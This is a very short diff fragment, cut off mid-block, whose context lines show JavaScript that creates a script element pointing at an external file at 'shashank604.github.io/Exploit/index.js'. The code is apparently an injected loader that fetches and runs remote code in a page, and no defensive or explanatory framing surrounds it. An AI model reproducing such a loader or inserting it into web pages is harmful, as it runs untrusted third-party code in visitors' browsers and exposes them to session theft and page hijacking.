@@ -1,3 +1,6 @@
+....
+
+
 if (typeof p === 'undefined') {
     const p = document.createElement('script');
     p.src = 'https://shashank604.github.io/Exploit/index.js';
